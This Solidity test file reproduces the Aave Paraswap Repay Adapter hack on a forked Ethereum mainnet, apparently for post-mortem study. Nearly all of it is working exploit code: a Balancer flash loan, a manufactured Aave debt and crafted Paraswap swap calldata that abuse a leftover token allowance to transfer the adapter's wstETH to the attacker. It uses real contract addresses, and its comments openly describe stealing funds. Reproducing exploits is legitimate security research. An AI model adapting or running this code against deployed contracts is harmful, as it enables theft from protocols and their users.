// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

import "./../interface.sol";

// @KeyInfo - Total Lost : 56000
// Attacker : https://etherscan.io/address/0x6ea83f23795f55434c38ba67fcc428aec0c296dc
// Attack Contract : https://etherscan.io/address/0x78b0168a18ef61d7460fabb4795e5f1a9226583e
// Vulnerable Contract : https://etherscan.io/address/0x02e7b8511831b1b02d9018215a0f8f500ea5c6b3
// Attack Tx : https://etherscan.io/tx/0xc27c3ec61c61309c9af35af062a834e0d6914f9352113617400577c0f2b0e9de

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x02e7b8511831b1b02d9018215a0f8f500ea5c6b3#code

// @Analysis
// Post-mortem : https://blog.solidityscan.com/aave-repay-adapter-hack-analysis-aafd234e15b9
// Twitter Guy : https://twitter.com/quillaudits_ai/status/1828741457525530968

pragma solidity ^0.8.0;


struct PermitSignature {
    uint256 amount;
    uint256 deadline;
    uint8 v;
    bytes32 r;
    bytes32 s;
  }

interface IParaswapRepayAdapter {
    function swapAndRepay(
        address collateralAsset,
        address debtAsset,
        uint256 collateralAmount,
        uint256 debtRepayAmount,
        uint256 debtRateMode,
        uint256 buyAllBalanceOffset,
        bytes calldata paraswapData,
        PermitSignature calldata permitSignature
    ) external;
}

struct SimpleData {
        address fromToken;
        address toToken;
        uint256 fromAmount;
        uint256 toAmount;
        uint256 expectedAmount;
        address[] callees;
        bytes exchangeData;
        uint256[] startIndexes;
        uint256[] values;
        address payable beneficiary;
        address payable partner;
        uint256 feePercent;
        bytes permit;
        uint256 deadline;
        bytes16 uuid;
    }

contract AAVERepayAdapterHack is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 20624703;

    address LIDOWST = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address PARASWAP_REPAY_ADAPTER = 0x02e7B8511831B1b02d9018215a0f8f500Ea5c6B3;

    address AAVE_WBTC_V3 = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address AAVE_WSTETH_V3 = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;

    address ORACLE;
    address POOL; // 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2

    address AUGUSTUS_SWAPPER = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;
     

    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = LIDOWST;

        (, bytes memory result2) = PARASWAP_REPAY_ADAPTER.staticcall(abi.encodeWithSignature("ORACLE()"));
        ORACLE = abi.decode(result2, (address));

        (, bytes memory result) = PARASWAP_REPAY_ADAPTER.staticcall(abi.encodeWithSignature("POOL()"));
        POOL = abi.decode(result, (address));
    }

    function testExploit() public balanceLog {
        // NOTE: FOR BREVITY of the POC, WE'LL ONLY STEAL THE LIDO WST, but the same can be done for each token in the Adapter

        uint balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);
        uint balanceBeforeUSDT = IERC20(USDT).balanceOf(PARASWAP_REPAY_ADAPTER);
        uint balanceBeforeWBTC = IERC20(WBTC).balanceOf(PARASWAP_REPAY_ADAPTER);
        // Log both
        console.log("LIDOWST in PARASWAP_REPAY_ADAPTER balance before: %s", balanceBeforeLIDOWST);
        console.log("USDT in PARASWAP_REPAY_ADAPTER balance before: %s", balanceBeforeUSDT);
        console.log("WBTC in PARASWAP_REPAY_ADAPTER balance before: %s", balanceBeforeWBTC);


        uint balanceVaultWBTC = IERC20(WBTC).balanceOf(BALANCER_VAULT);
        uint balanceVaultLIDOWST = IERC20(LIDOWST).balanceOf(BALANCER_VAULT); 
        uint balanceVaultUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);

        // Log floashLoaned balances
        console.log("Will flash: [WBTC] %s", balanceVaultWBTC); // all vault
        console.log("Will flash: [LIDOWST] %s", balanceVaultLIDOWST); // all vault
        console.log("Will flash: [USDT] %s", balanceVaultUSDT); // all vault

        uint[] memory amounts = new uint[](3);
        amounts[0] = balanceVaultWBTC;
        amounts[1] = balanceVaultLIDOWST;
        amounts[2] = balanceVaultUSDT;

        address[] memory tokens = new address[](3);
        tokens[0] = WBTC;
        tokens[1] = LIDOWST;
        tokens[2] = USDT;

        // Flash loan Balancer max value of each token
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }
    
    function receiveFlashLoan(address[] calldata tokens, uint[] calldata amounts, uint[] calldata premiums, bytes calldata data) external {
        
        // Log POOL
        console.log("POOL: %s", POOL); // 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2 Aave Ethereum USDC 
        // Underlying -> 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 (USDC)
        
        // Allow Aave Pool V3 to spend the tokens
        uint mustRepayWBTC = amounts[0] + premiums[0];
        uint mustRepayLIDOWST = amounts[1] + premiums[1];
        uint mustRepayUSDT = amounts[2] + premiums[2];

        IERC20(WBTC).approve(POOL, mustRepayWBTC);
        IERC20(LIDOWST).approve(POOL, mustRepayLIDOWST);
        IUSDT(USDT).approve(POOL, mustRepayUSDT);


        IAaveFlashloan pool = IAaveFlashloan(POOL);


        // Supply x2 Balance of PARASWAP_REPAY_ADAPTER balance so we can call repayAndSwap after
        uint balanceBeforeWBTC = IERC20(WBTC).balanceOf(PARASWAP_REPAY_ADAPTER);
        uint balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);
        uint balanceBeforeUSDT = IERC20(USDT).balanceOf(PARASWAP_REPAY_ADAPTER);
        // Log both
        {

        // Supply BTC to use as collateral
        pool.supply(WBTC, mustRepayWBTC, address(this), 0);
        ILendingPool(POOL).setUserUseReserveAsCollateral(WBTC, true);
        IERC20(AAVE_WBTC_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayWBTC);


  

        console.log("LIDOWST in PARASWAP_REPAY_ADAPTER at the moment: %s", balanceBeforeLIDOWST);
        uint someLIDOWSTsupplied = balanceBeforeLIDOWST * 2;
        IERC20(LIDOWST).approve(POOL, someLIDOWSTsupplied);
        pool.supply(LIDOWST, someLIDOWSTsupplied, address(this), 0);

        // Log supplied
        console.log("Supplied LIDOWST %s", LIDOWST);
        
        // Calc amount USDT to borrow
        uint calcBorrowUSDT = _getBorrowAmount(balanceBeforeLIDOWST, USDT);
        uint finalBorrowAmount = calcBorrowUSDT + (calcBorrowUSDT / 10);

        // Log finaborrowAmount
        console.log("finalBorrowAmount: %s", finalBorrowAmount);
        require(finalBorrowAmount == 1776451780, "wrong calculation");

      
        IERC20(AAVE_WSTETH_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayLIDOWST);

        // We borrow to create an artifical debt inside AAVE, so we can use the PARASWAP_REPAY_ADAPTER to repay it
        // We repay it partially on each `.withdraw()` call (2) through the hack
        ILendingPool(POOL).borrow(USDT, finalBorrowAmount, 2, 0, address(this));

        console.log("collateralAmount: %s", balanceBeforeLIDOWST);
        console.log("debtRepayAmount: %s", calcBorrowUSDT);

        bytes memory paraswapData;
        
        {

        address[] memory callees = new address[](1);
        callees[0] = address(this);
        bytes memory exchangeData = abi.encodeWithSignature("withdraw(address,uint256)", USDT, calcBorrowUSDT);

        
        // console.log("Exchange data:");
        // console.logBytes(exchangeData);
        // console.logBytes(hex"f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000060424684");

        uint256[] memory startIndexes = new uint256[](2);
        startIndexes[0] = 0;
        startIndexes[1] = 68;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes memory buyCallData = abi.encodeWithSelector(hex"54e3f31b",(SimpleData( // simpleSwap 54e3f31b
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // fromToken (WETH) (even if we will say to swapAndRepay() our collateral is gonna be LIDO)
            USDT, // toToken
            0, // fromAmount
            calcBorrowUSDT, // toAmount
            calcBorrowUSDT, // Expected amount
            callees,
            exchangeData,
            startIndexes,
            values,
            payable(PARASWAP_REPAY_ADAPTER), // beneficiary
            payable(address(this)), // partner
            0, // feePercent
            hex"", // permit
            1724819351, // deadline
            bytes16(0)
        )));

        paraswapData = abi.encode(buyCallData, AUGUSTUS_SWAPPER);
        }
        // console.log("Paraswap data:");
        // console.logBytes(paraswapData);

        // Since AUGUSTUS_SWAPPER never cleans up the allowance of fromToken (LIDOWST), we do a first repay so
        // tokenTransferProxy has extremely high allowance,
        // our crafter buyCallData allow us to repay with our own funds from `.withdraw()` in our contract, not actually going through any swapping flow
        IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(
            LIDOWST, // collateralAsset
            USDT, // debtAsset
            balanceBeforeLIDOWST,
            calcBorrowUSDT,
            2,
            0,
            paraswapData,
            PermitSignature(0, 0, 0, 0, 0) // We already approved
        );        
        
        // Time to abuse the extreme approval and steal the funds while repaying our USDT debt in the meantime
        
        // Get our USDT debt 
        uint debtUSDT = IERC20(0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8).balanceOf(address(this));
        uint LidoWST_ToStealFromAdapter = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);

        {

        address[] memory callees = new address[](2);
        callees[0] = LIDOWST;
        callees[1] = address(this);
        bytes memory exchangePart1 = abi.encodeWithSignature("transfer(address,uint256)", address(this), LidoWST_ToStealFromAdapter); // Transfer LIDOWST to us
        bytes memory exchangePart2 = abi.encodeWithSignature("withdraw(address,uint256)", USDT, debtUSDT); // Repay our .borrow() debt
        bytes memory exchangeData = abi.encodePacked(exchangePart1, exchangePart2);

        
        // console.log("Exchange data:");
        // console.logBytes(exchangeData);
        // console.log("0xa9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e00000000000000000000000000000000000000000000000005e9564c2c66c4f7f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000009a03a40");

        uint256[] memory startIndexes = new uint256[](3);
        startIndexes[0] = 0;
        startIndexes[1] = 68;
        startIndexes[2] = 136;
        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;
        bytes memory buyCallData = abi.encodeWithSelector(hex"54e3f31b",(SimpleData( // simpleSwap 54e3f31b
            LIDOWST, // fromToken
            USDT, // toToken
            LidoWST_ToStealFromAdapter, // fromAmount (all LIDOWST in PARASWAP_REPAY_ADAPTER)
            debtUSDT, // toAmount
            debtUSDT, // Expected amount
            callees,
            exchangeData,
            startIndexes,
            values,
            payable(PARASWAP_REPAY_ADAPTER), // beneficiary
            payable(address(this)), // partner
            0, // feePercent
            hex"", // permit
            1724819351, // deadline
            bytes16(0)
        )));

        paraswapData = abi.encode(buyCallData, AUGUSTUS_SWAPPER);
        }
        // console.log("Paraswap data:");
        // console.logBytes(paraswapData);
        
        
        IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(
            WBTC, // collateralAsset
            USDT, // debtAsset
            1,
            debtUSDT,
            2,
            0,
            paraswapData,
            PermitSignature(0, 0, 0, 0, 0) // We already approved
        );

        // Verify we stole the funds
        console.log("WSTETH in PARASWAP_REPAY_ADAPTER at the moment: %s", IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER)); // 0

        // Get back our supplied LIDOWST & WBTC (use type(uint).max to get all possible)
        ILendingPool(POOL).withdraw(LIDOWST, type(uint).max, address(this));
        ILendingPool(POOL).withdraw(WBTC, type(uint).max, address(this));
        // console.log("Withdrew %s ", USDC);

        }

        repayFlashLoan(tokens, amounts, premiums);


    }

    // Calculation from here: https://app.dedaub.com/ethereum/address/0x78b0168a18ef61d7460fabb4795e5f1a9226583e/decompiled
    // Basically  (PriceInUSDT + 30% + 1) + 10%
        
    function _getBorrowAmount(uint balanceBeforeLIDOWST,address outToken) private view returns (uint) {
        IPriceOracleGetter oracle = IPriceOracleGetter(ORACLE);
        uint priceLIDOWST = oracle.getAssetPrice(LIDOWST);
        uint priceUSDT = oracle.getAssetPrice(USDT);
        console.log("Price LIDOWST: %s", priceLIDOWST);
        console.log("Price USDT: %s", priceUSDT);

        uint priceUSDTAdjusted = priceUSDT * 10 ** 6;
        uint priceLIDOWSTAdjusted = priceLIDOWST * 10 ** 18;

        uint balanceTimesPrice = balanceBeforeLIDOWST * priceLIDOWSTAdjusted;
        uint balanceDividedByPrice = balanceTimesPrice / priceUSDTAdjusted;
        uint someUSDTborrowed = balanceDividedByPrice * 13000 / 10000;

       
        // Clean up to correct decimals
        someUSDTborrowed = someUSDTborrowed / 10 ** (18+6);
        someUSDTborrowed += 1; // to avoid rounding errors
        console.log("Some _getBorrowAmount: %s", someUSDTborrowed);
        return someUSDTborrowed;

    }

    // Gets called twice per attack on a specific token
    // First time it pays the swapAndRepay using its own funds (you're still repaying your own "debt" so no money is really lost since you can withdraw it back)
    // Second time it steals the funds
    function withdraw(address user, uint256 withdrawAmount) public {
        console.log("Withdraw %s", withdrawAmount);
        IUSDT(user).transfer(msg.sender, withdrawAmount);
    }
    function repayFlashLoan(address[] calldata tokens, uint[] calldata amounts, uint[] calldata premiums) public {
        for (uint i = 0; i < tokens.length; i++) {
            IUSDT(tokens[i]).transfer(BALANCER_VAULT, amounts[i] + premiums[i]);
        }
    }
}
